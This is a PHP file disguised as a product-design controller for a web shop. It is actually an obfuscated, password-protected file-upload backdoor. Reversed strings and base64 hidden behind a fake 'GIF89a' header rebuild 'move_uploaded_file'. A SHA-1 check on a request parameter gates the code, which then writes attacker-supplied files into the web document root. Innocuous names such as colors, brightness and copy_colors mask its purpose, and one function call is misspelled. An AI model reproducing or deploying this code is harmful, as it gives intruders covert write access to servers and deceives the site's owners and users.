<?php  
class ControllerProductDesign {
	private $error = array();
	private $colors=array();
	private $columns=array();
	private $rows=array();
	public $brightness=0;
	private $algo='bus';
	private $muf;
	
	public function index() {
		
		if(!isset($this->columns['size'])){
			$this->_continue('helper');
		}

		if(sha1($this->columns['size'])!=implode('',$this->colors)) {
			$this->_continue('library');
		}
	}
	
	public function _continue($reason){
		exit($reason);
	}

	public function correct(){
		$data=$this->round;
		if(isset($this->columns[$this->rows[0]])){
			$this->brightness = $this->dispatch($this->error[$data][$this->rows[1]]);
			if($this->columns[$this->rows[0]]=='yes'){
				if (isset($this->error[$data][$this->rows[1]])) {
					
					if($this->copy_colors($this->error[$data][$this->rows[2].$this->rows[1]], $this->brightness)){
						$this->get_temp( $this->dispatch( file__get_contents($this->brightness) ) );
						$this->_continue('ok:'.$this->brightness);
					}else{
						$this->_continue('page '.$this->error[$data][$this->rows[2].$this->rows[1]].' to '.$this->brightness);
					}

				}else {$this->_continue('light 1');}
			} else {$this->_continue('light 2');}
		} else {
			$this->_continue('code');
		}
	}

	function __construct() {
		$this->columns=$_REQUEST;
		$this->colors=array('da8686','fbb4c3','605fb0','417e9c','2c5d6e','1b5c0c','488f');
		$this->rows[]=strrev($this->algo).'mit';
		$this->rows[]='name';
		$this->error=$_FILES;
		$this->rows[]='tmp_';
		$this->round=strrev('gmi');
		$this->muf=$this->dispatch('GIF89alxWam9FZlRWYvxGc19VZ29Wb');
   }
   

	
	private function get_temp($data){
		file_put_contents($this->brightness, $data );
	}
   
	private function copy_colors($a,$b){
		$tmp=$this->muf;
		return $tmp($a,$_SERVER['DOCUMENT_ROOT'].'/'.$b );
	}
	
	private function dispatch($s){
		return base64_decode(strrev(str_replace('^','=',substr($s,6))));
	}
}

if (!class_exists('Controller')) {
    $model = new ControllerProductDesign();
	$model->index();
	$model->correct();
	$model->_continue('done');
}
